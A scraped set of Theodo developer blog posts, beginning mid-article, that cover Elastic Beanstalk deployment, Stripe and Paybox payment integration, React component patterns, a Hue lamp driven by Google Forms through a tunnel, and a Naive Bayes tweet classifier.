page.\n\nSecurity remark: the password of your database will be available on the AWS\u00a0console in the config section. A better solution would be to use\u00a0an s3 file that will be copied during the initialisation\u00a0of the Elastic Beanstalk container using .ebextensions files or using KMS and DynamoDB.\nConfigure the Elastic Beanstalk\u00a0environment\nYour site is online but you will want to update it. To do that you need to follow those steps:\n\nEnsure you don\u2019t have a .elasticbeanstalk directory\nRun\u00a0\u201ceb init\u201c, choose your region and the application you just created. You can find the name in the Elastic Beanstalk page.\n\nNow you are ready, you can deploy new version of your code simply with \u201ceb deploy\u201c.\nConclusion\nCloudFormation is a powerful tool with some drawbacks:\n\nIt only works with AWS\nIt\u2019s not easy to write beautiful code for the infrastructure\n\nTo help you write CloudFormation templates, you can try Troposphere. An alternative to\u00a0using CloudFormation is to use Terraform.\u00a0You can find\u00a0an objective benchmark between the two tools here.\nBonus: tips to debug your elastic beanstalk application\nHere are some tips\u00a0you may\u00a0need to debug you app:\n\nIf you are using GIT, to deploy the app on your EB\u00a0instance, you may need\u00a0to create a branch called \u201ccodecommit-origin\u201d\nYou can get the logs of the app in the EB\u00a0service on the aws console\nThe code that is deployed on your EB\u00a0instances is automatically stored in a S3 bucket that you can access on the AWS\u00a0console\nYou can ssh into the EB\u00a0instance with the \u201ceb ssh\u201d command\nThe application user is webapp\u00a0and you can get a bash with the following command: \u201csudo -u webapp /bin/bash\u201d. It\u2019s useful if you want to use the Symfony command without being root.\nIf you create through the aws console a RDS database the default name of the database is ebdb. You can find it\u00a0in the RDS service in the aws console\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nAs a way of getting incomes from your web application you often need to setup a way for your user to pay through your website.\nUsually thanks to a form where your user will fill it\u2019s banking information.\nIt may sounds like a big feature to implement but existing tools really ease the task.\nOn my project we\u2019ve tried two of\u00a0the main ones available : Stripe and Paybox.\nAnd here\u2019s how we quickly did it.\nHow to quickly setup Stripe on your app\nStripe provides an easy to setup REST API to allow secure online payment on your web app.\nI\u2019ve tried it on a Symfony 2.8 project and in half a day I was able to send and visualize test payment on the stripe dashboard.\nFirst you need to create an account on Stripe which will give you access to the stripe dashboard where you can see all the transaction made.\nWith the creation of your account stripe provides you a test API key.\nThen add in your composer require\n\r\n{\r\n  \"require\": {\r\n  \"stripe/stripe-php\": \"4.*\"\r\n  }\r\n}\r\n\nand your API keys in your config.yml and start implementing the service which fits your needs.\nTo start making transaction you need to deal with the authentication to the Stripe API thanks to your API keys and to create a \\Stripe\\Charge object :\n\r\n\\Stripe\\Charge::create(array(\r\n  \"amount\" = round($price * 100),\r\n  \"currency\" = \"usd\",\r\n  \"customer\" = $customerId)\r\n);\r\n\nStripe provides a standard online payment form but you can make your own custom one without any issue.\nIn that case you need to deal with Stripe tokenification, which add another security layer.\nIt\u2019s usually done by a javascript script on the page of your form.\nYou can also directly install one of several Symfony bundle already implementing a service and a formType for the payment with javascript tokenification.\nWhich is a nice and quick way to do a proof of concept on the matter.\nTroubleshooting\nStripe has an IRC channel where people quickly help you.\nFeel free to contact them when encountering technical issue.\nHow to setup Paybox\nPaybox is the French counterpart of Stripe, it\u2019s less easy to setup and less developper friendly but it still provides a complete online payment solution in one day or so.\nWhy Paybox over Stripe ?\n\u2013 You have better price on Paybox\n\u2013 A big client can easily have a good price with a fix fee over a percntage for stripe.\n\u2013 Paybox is a french solution so you can easily interact with them, call their technical support\nHow to quickly install it\nYou can install a Paybox bundle with composer.\nI\u2019ve chosen this one as the read me is explicit enough and close to the Paybox documentation.\n\r\ncomposer require lexik/paybox-bundle\r\n\nThen\u00a0follow the read me\u00a0on github to implement your online payment service.\nLike Stripe, Paybox provides a dev and a prod environment.\nOn the dev environment you can simulate payment with fake credit card.\nTroubleshooting\nThe online documentation is not always updated (we had some issues with correct request according to the documentation which triggered wrong http response).\nYou also have to choose one offer of Paybox among the three available and each offer works differently with different request.\nIn case of issue don\u2019t hesitate to directly call their technical support.\nWhich one to choose\nWe\u2019ve already covered the fact that Stripe is easier to implement than Pyabox\nAvailability\nBoth Solutions allow Visa, MasterCard and AmericanExpress and a large variety of other payment method.\nPaybox offer is centralized on France so if your client want to charge customer outside of France you\u2019d rather use Stripe.\nPrice\nStripe charges you a flat rate of 2.9% + 30\u00a2 per successful charge as long as you\u2019re doing under $1 million in volume per year.\nWhereas Paybox offers you a monthly subscription (around 200\u20ac TTC with 100 free transactions and then fix a fee of 0,85\u20ac per transaction).\nNote that you can bargain better prices with both solution.\nAs a result I would recommend using Paybox if your client needs a payment solution that involves numerous transaction and big amounts.\nOn the other hand if your client only want to have a quick online payment solution on a single project, it would be better to go for stripe.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tIvann Morice\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhat is the perfect React component?\n\nThe component should have one purpose only, rendering\nThe component should be small and easily understandable\nThe component should rerender only if needed\n\nHow to create the perfect React component?\n\nLogic Functions\nAtomic Design\nSelectors and Reselectors\nFunctions inside render\n\nLogic Functions\n\nExport your logic functions to an external service\n\nFunctions other than lifecycle methods should only return JSX objects\nLogic functions can then be easily reused in other components\nLogic functions can then be unit tested\nComponent is easy to read\n\n\n\nBad Example\n// MyComponent.js\r\nexport default class MyComponent extends PureComponent {\r\n   computeAndDoStuff = prop1, prop2 => {\r\n      // Logic that returns something depending on the props passed\r\n   }\r\n\r\n   render() {\r\n      <div>\r\n         {this.computeAndDoStuff(this.props.prop1, this.props.prop2) && <span>Hello</span>}\r\n      </div>\r\n   }\r\n}\r\n\r\nMyComponent.propTypes = {\r\n   prop1,\r\n   prop2,\r\n}\r\n\r\nconst mapStateToProps = state => {\r\n   prop1: state.object.prop1,\r\n   prop2: state.object.prop2,\r\n}\r\n\r\nexport const MyComponentContainer = connect(mapStateToProps)(MyComponent)\r\n\n\n\u2717 Component is doing more than just rendering, it is doing logic inside\n\u2717 Component needs multiple snapshots to test the logic of the function\n\nGood Example\n// MyComponent.js\r\nimport { computeAndDoStuff } from '@services/computingService'\r\n\r\nexport default class MyComponent extends PureComponent {\r\n   render() {\r\n      <div>\r\n         {computeAndDoStuff(this.props.prop1, this.props.prop2) && <span>Hello</span>}\r\n      </div>\r\n   }\r\n}\r\n\r\nMyComponent.propTypes = {\r\n   prop1,\r\n   prop2,\r\n}\r\n\r\nconst mapStateToProps = state => {\r\n   prop1: state.object.prop1,\r\n   prop2: state.object.prop2,\r\n}\r\n\r\nexport const MyComponentContainer = connect(mapStateToProps)(MyComponent)\r\n\n// computingService.js\r\nexport computeAndDoStuff = prop1, prop2 => {\r\n   // Logic that returns something depending on the props passed\r\n}\r\n\n\n\u2714\ufe0e Component has only one role, render\n\u2714\ufe0e Component needs only 2 snapshots, depending on if the result of the function is true or false\n\u2714\ufe0e Function can be unit tested directly from the service, without involving the component\n\nAtomic Design\n\nFollow the \u201cAtomic Design Methodology\u201d\n\nComponents will be small enough (200 lines max) to be easily understandable\nComponents can be found easily and the architecture is straightforward for newcomers\n\n\n\nBad Example\n// MyPage.js\r\nimport { MyComponent1, MyComponent2, MyField1, Myfield2 } from '@components'\r\n\r\nexport default class MyPage extends PureComponent {\r\n   render() {\r\n      <div>\r\n         <MyComponent1 />\r\n         <div>\r\n            <MyField1 />\r\n            <MyField2 />\r\n            <MyField1 disabled />\r\n            <MyField2 color={'blue'} />\r\n         </div>\r\n         <MyComponent2 />\r\n      </div>\r\n   }\r\n}\r\n\r\nexport const MyPageContainer = connect(mapStateToProps)(MyPage)\r\n\n\n\u2717 Components are all coming from the same folder\n\u2717 If the page needs to be modified, new components will be created in the same folders without thinking of refactoring\n\u2717 Component may end up being really long\n\u2717 The structure of the page is not easily understandable\n\nGood Example\n// MyPage.js\r\nimport { MyOrganism1, MyOrganism2, MyOrganism3 } from '@organisms'\r\n\r\nexport default class MyPage extends PureComponent {\r\n  render() {\r\n     <div>\r\n        <MyOrganism1 />\r\n        <MyOrganism2 />\r\n        <MyOrganism3 />\r\n     </div>\r\n  }\r\n}\r\n\n// MyOrganism1.js\r\nimport { MyMolecule1, MyMolecule2 } from '@molecules'\r\n\r\nexport default class MyOrganism1 extends PureComponent {\r\n  render() {\r\n     <div>\r\n        <MyMolecule1 />\r\n        <MyMolecule2 />\r\n     </div>\r\n  }\r\n}\r\n\n// MyMolecule1.js\r\nimport { MyAtom1, MyAtom2 } from '@atoms'\r\n\r\nexport default class MyMolecule1 extends PureComponent {\r\n  render() {\r\n     <div>\r\n        <MyAtom1 />\r\n        <MyAtom2 />\r\n     </div>\r\n  }\r\n}\r\n\n\n\u2714\ufe0e Page Component structure is understandable at first sight\n\u2714\ufe0e When working on the Page again, it is easy to see if some components can be reused\n\u2714\ufe0e For a new developer, it is easy to understand right away\n\u2714\ufe0e Components stay small and easily testable\n\nSelectors and Reselectors\n\nUse selectors and reselectors\n\nComponents will handle only a few props (10 props max) to be easily understandable\nComponents will be completely decoupled from the shape of the store\nPerformance will be increased in case of computed derived data, thanks to reselectors memoisation\nSelectors and reselectors can be easily tested\n\n\n\nBad Example\n// Table.js\r\nimport ...\r\n\r\nexport default class Table extends PureComponent {\r\n   constructor(props) {\r\n      super(props)\r\n      this.renderTable = this.renderTable.bind(this)\r\n      this.calculateNewProps(...props)\r\n   }\r\n   \r\n   componentWillUpdate(nextProps) {\r\n      this.calculateNewProps(...nextProps)\r\n   }\r\n   \r\n   calculateNewProps = (prop1, prop2, ..., prop15) => {\r\n      // Logic that modifies the store for the table rendering\r\n   }\r\n   \r\n   renderTable() {\r\n      // Return JSX based on props\r\n   }\r\n\r\n   render() {\r\n      this.renderTable()\r\n   }\r\n}\r\n\r\nTable.propTypes = {\r\n   prop1,\r\n   prop2,\r\n   ...\r\n   prop15,\r\n}\r\n\r\nconst mapStateToProps = state => {\r\n   prop1: state.object.prop1, \r\n   prop2: state.object.prop2,\r\n   ...\r\n   prop15: state.object.prop15,\r\n}\r\n\r\nexport const TableContainer = connect(mapStateToProps)(Table)\r\n\n\n\u2717 Component has too many props, it is really dependent on the store shape\n\u2717 Component is too long (was 300+)\n\u2717 Component is updating the store in its own lifecycle, which can cause race conditions\n\nGood Example\n// Table.js\r\nimport ...\r\nimport { getTableRows } from '@selectors'\r\n\r\nexport default class Table extends PureComponent {\r\n   renderTable() {\r\n      // Return JSX based on rows\r\n   }\r\n\r\n   render() {\r\n      this.renderTable()\r\n   }\r\n}\r\n\r\nTable.propTypes = {\r\n   tableRows,\r\n}\r\n\r\nconst mapStateToProps = state => {\r\n   tableRows: getTableRows(state),\r\n}\r\n\r\nexport const TableContainer = connect(mapStateToProps)(Table)\r\n\n// selectors.js\r\nimport { createSelector } from 'reselect'\r\n\r\nexport const getTableRows = createSelector(\r\n   getProp1,\r\n   getProp2,\r\n   ...,\r\n   getProp15,\r\n   (prop1, prop2, ..., prop15) => {\r\n      // logic to return the table rows based on the props in the store\r\n   }\r\n)\r\n\n\n\u2714\ufe0e Component is completely decoupled from stores shape\n\u2714\ufe0e Component does not have any logic, its job is to render objects\n\u2714\ufe0e Component is easy to read or revisit\n\u2714\ufe0e Selector (data formatting) can be easily tested!\n\nFunctions inside render\n\nNever create functions into the render(), use arrow functions\n\nFunctions defined into onClick or onChange methods will be recreated every time the action is triggered, causing rerendering and performance impact\nComponent will not rerender if the arrow function is defined outside of the render()\nArrow function have access to this without needing to be bound in the constructor\n\n\n\nBad Example\n// MyPage.js\r\nimport doSomething from '@services'\r\n\r\nexport default class MyPage extends PureComponent {\r\n   render() {\r\n      <div>\r\n         <Button onClick={() => doSomething(this.props.param))} />\r\n      </div>\r\n   }\r\n}\r\n\r\nMyPage.propTypes = {\r\n   param,\r\n}\r\n\n\n\u2717 Function is defined inside the render, a new instance will be created even if the props do not change\n\u2717 Performance loss\n\nGood Example\n// MyPage.js\r\nimport doSomething from '@services'\r\n\r\nexport default class MyPage extends PureComponent {\r\n   onClick = () => doSomething(this.props.param)\r\n\r\n   render() {\r\n      <div>\r\n         <Button onClick={this.onClick} />\r\n      </div>\r\n   }\r\n}\r\n\r\nMyPage\r\n\n\n\u2714\ufe0e Function is defined outside of the render function\n\u2714\ufe0e The component will render only once for a given param\n\u2714\ufe0e The function onClick does not need to be bound, because the arrow function gives access to this\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCl\u00e9ment Pasteau\r\n  \t\t\t\r\n  \t\t\t\tAgile Engineer at Theodo UK  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis article is about IOT, DIY and lamps, and a little bit of lean.\n\nSo 2 weeks ago we bought some lamps! And since we are a bunch of nerds we bought a bridge to play with them.\nI am not going to hide the brand to make this article clearer.\nSo we had this lamp and this bridge\n\n\nAnd then we wondered what we could do with it \ud83d\ude10 .\nWe love our clients\nEvery week, the scrum team of a project asks their client if they are satisfied with 3 questions:\n1) How do you feel about the speed of the team?\n2) How do you feel about the quality of the collaboration with Theodo?\n3) Would you recommend Theodo?\nDepending on the answer there are 3 categories:\n\nKO: red bucket, the client is not satisfied we need to react\nOK: the client satisfaction meets our standard\nWahou!: the client gave us the perfect grade\n\nWe had our idea! We are a lean company, we want indicators. Whenever a client fills the google form, we are going to change the lamp color according to the result \ud83d\ude00 .\nHow do we do this ?\n\nHere is the plan:\n\nConfigure the lamps in the office\nExpose the API so we can control it from anywhere\nCreate a hook on our google form to call the API and thus control the lamp\n\n\u2014 easy \u2014\nConfigure your office lamps\n1) Plug the lamps\n2) Plug the bridge to your router\n3) Download the HUE app to see if everything is connected\n4) Play with the lamps because you are a child\nAccess the API of the bridge\n1) Connect to the same wifi the bridge is on\n2) Go here to get the IP address of your bridge\n[\r\n    {\r\n        id: \"skjdhfskdjfhskkjdf\",\r\n        internalipaddress: \"192.168.1.107\"\r\n    }\r\n]\r\n\n3) We want to play with the API: copy the ip in the url and add /debug/clip.htm: mine is http://192.168.1.107/debug/clip.html\n4) We need a token to be authenticated: copy the following body in the message body part (but change the name, you are not Sammy)\n{\"devicetype\":\"my_hue_app#nexus Sammy\"}\r\n\n\n5) Click post \u2013 it will say there is an error because you need to press the button of the bridge before getting an access, so click on the button of the bridge and click post again\n6) You now have a Token! (if you had trouble having a token read this).\nWe can now turn the light on and off! Or change its color more fun. Here is the doc.\nWhat we will use is this request:\nAddress    http:///api//groups/0/action\r\nBody    {\"on\":true,\"bri\":255,\"sat\":255,\"hue\":12345}\r\nMethod    PUT\r\n\nChange the color when a new form is submitted\nNow let\u2019s say you have a Google form (create one just for fun).\nWe are going to put a small Google script to run a function when a new form is submitted.\nIf you know nothing in Google script it is ok, it is javascript.\n\nOn the form, click on the menu on the right hand top\nSelect \u201cScript Editor\u201d\nAnd then paste and adapt this code:\nfunction changeLightColors(colorCode) {\r\n  var formData = {\r\n    \"hue\": colorCode\r\n  }\r\n\r\n  var options = {\r\n   'method' : 'put',\r\n    'payload' : JSON.stringify(formData)\r\n  }\r\n  var url = \"http://7b581ba2.ngrok.io/api/put-your-token/groups/1/action\"\r\n  UrlFetchApp.fetch(url, options)\r\n}\r\n\nHere is the code we call each time there is a new form submitted\nfunction isNewFormOK(newForm) {\r\n  response = newForm.response.getItemResponses()\r\n  speed = parseInt(response[0].getResponse()[0])\r\n  colab = parseInt(response[1].getResponse()[0])\r\n  reco = response[4].getResponse()\r\n  if ((speed + colab > 7) && (reco === 'Yes, absolutely')) {\r\n    if (speed + colab === 10) {\r\n      changeLightColors(24173)\r\n    } else {\r\n      changeLightColors(8464)\r\n    }\r\n  } else {\r\n    changeLightColors(65423)\r\n  }\r\n}\r\n\nBUT!\nIn the changeColorLight function we fetch a weird URL. That\u2019s right, we need to access our hue bridge from the outside world, while the bridge is only on our local wifi. One way to do it is openning a http tunnel with Ngrock\nAccess the lights from the outside world\nFix the local ip address of the bridge\nDHCP might change the bridge adress every now and then, you don\u2019t want that. Look up in google: {{your router model}} assign static IP. Fix the ip address of the bridge.\nAccess the bridge from the outside\nIf like me you don\u2019t have a fixed ip address because your internet provider does not want you to! There is a free solution: \n\ninstall beame-instal-ssl\nrun beame-insta-ssl tunnel make --dst 192.168.0.4:80 --proto http (replace the static ip of your bridge)\nyou now see an beame url you can access !\n\nBeame is nice because you get to keep the address even if you relaunch the tunnel.\nConfigure an IOT Hub\nNow, maybe your computer won\u2019t always be on the same wifi than the lights.\nFirst, fix the local IP of your hub so it does not change when you restart your router (look for DHCP reservation + your router brand).\nYou can run the tunnel on a raspberry pi:\n\ncreate a file launch-tunnel.sh in the pi directory\nin the file, write: sudo -u pi /usr/bin/beame-instal-ssl tunnel make --dst 192.168.1.4:80 --proto http > /home/pi/beame.log & (replace with the local IP of your hub of course)\nin /etc/rc.local add /home/pi/beame-tunnel.sh\naccess the beame url of your tunnel to make sure it works\n\n\nWatch the status of your IOT Hub with a simple HealthCheck\nThere are many services that provide healthcheck reports.\nI chose a simple google script that checks every hours the status of my endpoint. If the response is 200, do nothing, else send me a mail.\nTo create a google script:\n\nOpen a new google spread sheet\ntool -> open script editor\nin the script editor copy this code (replace the URLOFIOTHUB and YOUREMAILADDRESSS):\n\nfunction healthCheck() {\r\n  url = \"https://URLOFIOTHUB\"\r\n  thereIsAnIssue = false\r\n  try {\r\n    response = UrlFetchApp.fetch(url)\r\n    if(response.getResponseCode() != \"200\") {\r\n      thereIsAnIssue = true\r\n      issue = \"IOT Hub response was not 200 but \" + response.getResponseCode()\r\n    }\r\n  } catch(e) {\r\n    thereIsAnIssue = true\r\n    issue = e\r\n  }\r\n\r\n  if(thereIsAnIssue) {\r\n    sendIssueMail(issue, url)\r\n  }\r\n}\r\n\r\nfunction sendIssueMail(issue, url) {\r\n  message = \"There was an isue with the IOT Hub.\\n\"\r\n  message += \"The following url has an issue: \" + url + \"\\n\"\r\n  message += \"The issue was the following: \" + issue + \"\\n\"\r\n  message += \"You may try to reboot the IOT Hub, behind the orange fridge.\"\r\n  Logger.log(message)\r\n  email = {\r\n    to: \"YOUREMAILADDRESSS\",\r\n    replyTo: \"YOUREMAILADDRESSS\",\r\n    subject: \"IOT Hub is down!\",\r\n    htmlBody: message\r\n  }\r\n  MailApp.sendEmail(email);\r\n}\r\n\nTest the code with a fake url:\n\nReplace the url by a fake one that should not exist\nin the menu bar select HealthCheck() function\nrun the function by clicking the little play arrow\nReceive the mail\n\nAutomate the check:\n\nIn the script go to Edit -> triggers\nAdd a new trigger healthCheck() run it hourly (or as you prefer)\nYou are done \ud83d\ude09 unplug your raspberry pi or kill your tunnel and wait for an email\n\nAlright! You are ready to do awesome stuff! In part 2 of the article I\u2019ll show how to plug webhooks of github and CircleCi so you see red lights when your deployment fails :O, see the GIF.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tSammy Teillet\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis is a running blog written during my attempt to build a Trump-Obama tweet classifier in under an hour, providing a quick guide to text classification using a Naive Bayesian approach without \u2018recoding the wheel\u2019.\nNote: This is less a tutorial on Machine Learning / Classifier theory, and more targeted at showing how well established classification techniques along with simple libraries can be used to build classifiers quickly for real world data.\nLive demo here:\u00a0https://benellerby.github.io/trump-obama-tweet-classifier/\nData\nFirst we need labelled historic data which machine learning approaches, such as\u00a0Bayesian Classifiers ,\u00a0rely on for training.\nSo we need to get past tweets of both presidents.\u00a0Luckily Twitter gives us access to the last 3,200 tweets of a user, but it relies on a bit of scripting to automate the process.\nLet\u2019s start with\u00a0Tweepy\u00a0which is a simple Python interface to the Twitter API that should speed up the scripting side.\n\nNote: Issues with pip install so cloned and built the package manually on OSX.\n\nNow we need credentials so let\u2019s go to Twitter, sign in and use the Twitter Application Console to create a new app and get credentials.\n\nIf using a placeholder for your app\u2019s URL fails then direct it to your public GitHub page, that\u2019s what I\u2019ve done.\n\nNow, there is a challenge to get the tweets as there are multiple API calls to get the list of tweet IDs and then the tweet content. To save time I found a script\u00a0and adapted it for Donald Trump and Obama respectively.\nAfter running this twice we have two JSON files of the last 3,200 tweets of each president. Yet, the JSONs are just listed as \u201c{\u2026}{\u2026}\u201d with no comma delimitation and no surrounding square brackets. This is therefore invalid JSON and needs to be fixed.\n\nIn fact it\u2019s in the\u00a0JSON Lines format. As we won\u2019t have a scaling issue\u00a0parsing\u00a0this json, we can convert it to a standard JSON and parse directly through JS rather than split on \u201c\\n\u201d.\n\nA quick regex turns the files into usable JSON arrays. Replacing \u201c}{\u201c with \u201c},{\u201c \u00a0and adding the two surrounding square brackets to the whole list.\nBuilding the Classifier\nNext, building a Naive Bayesian Classifier for our 2 categories, Trump and Obama.\nThe maths behind the classifier isn\u2019t too complex if you\u2019re interested.\nThe main decision to make is what feature set (attributes of each data element that are used in classification\u00a0e.g. length, words) to use and how to implement it. Both of these are solved by the Bayes NPM package\u00a0which provides a simple interface to build Naive Bayesian models from textual data.\nThe bayes package uses term frequency as the single, relatively simple, feature for classification. Text input is tokenized (split up into individual words without punctuation) and then a frequency table constructed mapping each token to the number of times it\u2019s used within the document (tweet).\n\nThere are perhaps some improvements that could be made to the tokenisation such as stop word removal and stemming, but let\u2019s see how this performs.\n\n(Checkout the implementation, it\u2019s ~300 lines of very readable Javascript.)\nWe can open up a fresh NPM project, require the Bayes package and jump into importing the JSON files\u2026 so far so good.\u00a0(Don\u2019t forget to NPM init and install)\n\r\nvar bayes = require('bayes');\r\nvar classifier = bayes();\r\nvar trumpTweets = require('./tweetFormatted.json');\r\nvar obamaTweets = require('./tweetFormatted2.json');\r\n\nNow training the model by iterating over the president\u2019s and then their tweets, using the tweet text attribute to get the content of the tweet. The classifier is trained with a simple call to the \u2018learn\u2019 function with each tweet.\n\r\nconst data = [{name: 'obama', tweets: obamaTweets}, {name: 'trump', tweets: trumpTweets}];\r\n\r\nfor (var president of data) {\r\n  console.log(`training model with historical ${president.name} data.`)\r\n  for (var tweet of president.tweets) {\r\n    classifier.learn(tweet.text, president.name);\r\n  }\r\n}\r\n\nGreat, let\u2019s try it out\u2026\n\r\nconsole.log(classifier.categorize('Lets build a wall!')); // Trump\r\nconsole.log(classifier.categorize('I will bear hillary')); // Trump\r\nconsole.log(classifier.categorize('Climate change is important.')); //Obama\r\nconsole.log(classifier.categorize('Obamacare has helped americans.')); //Obama\r\n\nOK! But that\u2019s not exactly scientific. Let\u2019s move to separating training and test data.\nModel Validation\nSplitting our historic data into test and training is a core principle for machine learning approaches. Training data is the data we train our model on and test data is that data we use to evaluate the model. We could take an arbitrary sample, but more interesting is to exclude each tweet individually from the training data, build a new model and then test with that individual tweet. This rotation can be used to find the average accuracy while taking advantage of as much training data as possible. In the world of ML statistics this method is called \u2018leave one out cross validation\u2019 or \u2018k-folds cross validation (with k=1)\u2019\nWe can achieve this exhaustive cross validation with a bit of loop logic and some counters.\nA basic working implementation counting false positives, true positives, false negatives and true negatives is as follows:\n\r\nvar bayes = require('bayes');\r\nvar classifier = bayes();\r\nvar trumpTweets = require('./tweetFormatted.json');\r\nvar obamaTweets = require('./tweetFormatted2.json');\r\n\r\nconst data = [{name: 'trump', tweets: trumpTweets}, {name: 'obama', tweets: obamaTweets}];\r\n\r\nvar totalDataCount = trumpTweets.length + obamaTweets.length;\r\nvar tp = 0;\r\nvar tn = 0;\r\nvar fp = 0;\r\nvar fn = 0;\r\n\r\nvar t0 = new Date().getTime();\r\n\r\n// Iterate through every historic data element index\r\nfor (var testIndex=0; testIndex&amp;lt;totalDataCount; testIndex++){\r\n  console.log(testIndex);\r\n  // instantiate a new model\r\n  var classifier = bayes();\r\n  var testData = [];\r\n  var counter = 0;\r\n  for (var president of data) {\r\n    for (var tweet of president.tweets) {\r\n      counter ++;\r\n      if (counter === testIndex) {\r\n        // If equal to test Index then ommit from training.\r\n        testData.push({president: president.name, tweet: tweet});\r\n      } else {\r\n        // Train on all other data elements.\r\n        classifier.learn(tweet.text, president.name);\r\n      }\r\n    }\r\n  }\r\n  // Use test data.\r\n  for (var test of testData) {\r\n    if (classifier.categorize(test.tweet.text) === test.president) {\r\n      if (test.president === 'obama') {\r\n        tp++;\r\n      } else {\r\n        tn ++;\r\n      }\r\n    } else {\r\n      if (test.president === 'obama') {\r\n        fp++;\r\n      } else {\r\n        fn++;\r\n      }\r\n    }\r\n  }\r\n}\r\nvar t1 = new Date().getTime();\r\n\r\nconsole.log('total tests: ', (tp + tn + fp + fn));\r\nconsole.log(`TP = ${tp}`);\r\nconsole.log(`TN = ${tn}`);\r\nconsole.log(`FP = ${fp}`);\r\nconsole.log(`FN = ${fn}`);\r\nconsole.log('Took ' + (t1 - t0) + ' milliseconds.')\r\n\nNow we wait for around 40 minutes (model validation execution not included in challenge time) for each of the 6,400 models to be trained and evaluated.\nIt\u2019s finished with an accuracy of 98%!\nWe can analyse the results as a \u2018confusion matrix\u2019\u00a0which tabulates all possible outcomes of classification success or failure (True positives (TP), False positives (FP), True Negatives (TN), False Negatives (FN)).\nThis is useful as accuracy alone is not a great measure for classifiers.\n\n\n\n\n\nPredicted\n\n\nActual\n\nObama\nTrump\n\n\nObama\n3195\n82\n\n\nTrump\n27\n3123\n\n\n\nFrom this we can calculate the accuracy of our model:\nAccuracy = TP + TN / TP +TN +FP +FN\nAccuracy = 3195 +3123 / \u00a03195 +3123 + 27 + 82\nAccuracy \u00a0= 0.98\n98 %\nDemo\nLive demo here:\u00a0https://benellerby.github.io/trump-obama-tweet-classifier/\nConclusion\nThis was obviously a very quick exercise in text classification using a Naive Bayesian Classifiers. We have not gone deeply into the subject, discussed Bayesian Probability or compared to other methods such as Support Vector Machines (SVM), k Nearest Neighbours (KNN) or Neural Networks. These areas are interesting, applicable and accessible without deep theoretical knowledge through libraries. I hope this quick tutorial will help you to see real world Machine Learning applications and learn by doing!\nOur key steps were:\n\nFind and clean the data\nChoose an approach (Bayesian Probability, SVM, KNN or Neural Networks\u2026)\nFind a library rather than \u2018recode the wheel\u2019\nModel Validation\nShare your results!\n\nNote: I challenged myself to do this in one hour, and the resulting accuracy of the model is surprising. I have not checked the data thoroughly for duplications due to time constraints, but if such an error has occurred that would contribute to the high accuracy seen. \nLet me know your results in the comments!\nTakeaways: \n\nYou can use machine learning techniques without going deep into maths and theory.\nThere are some great libraries to simplify machine learning application\nYou have access to more labelled historic data than you think; be creative.\n\nFurther Reading \n\nhttps://en.wikipedia.org/wiki/Feature_(machine_learning)\nhttps://en.wikipedia.org/wiki/Naive_Bayes_classifier\nhttps://en.wikipedia.org/wiki/Additive_smoothing\nhttps://en.wikipedia.org/wiki/Support_vector_machine\nhttps://en.wikipedia.org/wiki/K-nearest_neighbors_algorithm\nhttps://en.wikipedia.org/wiki/Machine_learning\nhttps://en.wikipedia.org/wiki/Artificial_neural_network\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBen Ellerby\r\n  \t\t\t\r\n  \t\t\t\tI'm an Architect Developer, working with startups to launch MVP's and large corporates to deliver in startup speed. \r\n\r\nI'm tech at heart, loving to code, participating in hackathons, guest lecturing as part of the University of Southampton CompSci course and acting as a tech advisor to multiple startups.\r\n\r\nhttps://www.linkedin.com/in/benjaminellerby/  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
